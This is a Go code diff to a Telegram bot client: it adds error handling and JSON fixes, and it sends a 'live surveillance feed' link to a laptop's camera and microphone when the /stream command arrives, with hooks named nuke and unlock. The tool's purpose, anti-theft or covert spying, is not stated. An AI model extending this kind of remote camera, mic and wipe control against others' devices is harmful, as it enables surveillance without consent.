@@ -27,7 +27,7 @@ func NewClient(botToken, chatID string) *Client {
 		botToken: botToken,
 		chatID:   chatID,
 		client: &http.Client{
-			Timeout: 45 * time.Second,
+			Timeout: 180 * time.Second, // 3 minutes timeout for heavy video surveillance uploads
 		},
 	}
 }
@@ -156,19 +156,26 @@ func (c *Client) SendMessageWithInlineButton(text, buttonText, callbackData stri
 	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", c.botToken)
 	replyMarkup := fmt.Sprintf(`{"inline_keyboard":[[{"text":"%s","callback_data":"%s"}]]}`, buttonText, callbackData)
 
-	payload := map[string]string{
+	payload := map[string]interface{}{
 		"chat_id":      c.chatID,
 		"text":         text,
 		"parse_mode":   "HTML",
-		"reply_markup": replyMarkup,
+		"reply_markup": json.RawMessage(replyMarkup),
 	}
 
-	jsonBytes, _ := json.Marshal(payload)
+	jsonBytes, err := json.Marshal(payload)
+	if err != nil {
+		return err
+	}
 	resp, err := c.client.Post(apiURL, "application/json", bytes.NewBuffer(jsonBytes))
 	if err != nil {
 		return err
 	}
 	defer resp.Body.Close()
+	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
+		b, _ := io.ReadAll(resp.Body)
+		return fmt.Errorf("telegram sendMessage error %d: %s", resp.StatusCode, string(b))
+	}
 	return nil
 }
 
@@ -191,6 +198,10 @@ func (c *Client) SendAlertMessage(message string) error {
 		return err
 	}
 	defer resp.Body.Close()
+	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
+		b, _ := io.ReadAll(resp.Body)
+		return fmt.Errorf("telegram sendMessage error %d: %s", resp.StatusCode, string(b))
+	}
 	return nil
 }
 
@@ -203,19 +214,26 @@ func (c *Client) SendMessageWithURLButton(text, buttonText, targetURL string) er
 	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", c.botToken)
 	replyMarkup := fmt.Sprintf(`{"inline_keyboard":[[{"text":"%s","url":"%s"}]]}`, buttonText, targetURL)
 
-	payload := map[string]string{
+	payload := map[string]interface{}{
 		"chat_id":      c.chatID,
 		"text":         text,
 		"parse_mode":   "HTML",
-		"reply_markup": replyMarkup,
+		"reply_markup": json.RawMessage(replyMarkup),
 	}
 
-	jsonBytes, _ := json.Marshal(payload)
+	jsonBytes, err := json.Marshal(payload)
+	if err != nil {
+		return err
+	}
 	resp, err := c.client.Post(apiURL, "application/json", bytes.NewBuffer(jsonBytes))
 	if err != nil {
 		return err
 	}
 	defer resp.Body.Close()
+	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
+		b, _ := io.ReadAll(resp.Body)
+		return fmt.Errorf("telegram sendMessage error %d: %s", resp.StatusCode, string(b))
+	}
 	return nil
 }
 
@@ -417,7 +435,11 @@ func (c *Client) StartPolling(ctx context.Context, onNuke func(), onUnlock func(
 						go func() {
 							streamURL := onGetStreamURL()
 							if streamURL != "" {
-								_ = c.SendMessageWithURLButton("🔴 <b>LIVE SURVEILLANCE FEED</b>\n\nTap tombol di bawah untuk menonton siaran langsung kamera & audio laptop secara real-time:", "👁️ TONTON LIVE STREAM", streamURL)
+								msg := fmt.Sprintf("🔴 <b>LIVE SURVEILLANCE FEED</b>\n\nLink Kamera & Mic:\n%s\n\nTap tombol di bawah untuk menonton siaran langsung secara real-time:", streamURL)
+								err := c.SendMessageWithURLButton(msg, "👁️ TONTON LIVE STREAM", streamURL)
+								if err != nil {
+									_ = c.SendAlertMessage(fmt.Sprintf("🔴 <b>LIVE SURVEILLANCE FEED</b>\n\nLink Siaran Langsung:\n%s", streamURL))
+								}
 							} else {
 								_ = c.SendAlertMessage("⚠️ Menyiapkan feed live stream... Coba kirim /stream lagi dalam 2 detik.")
 							}
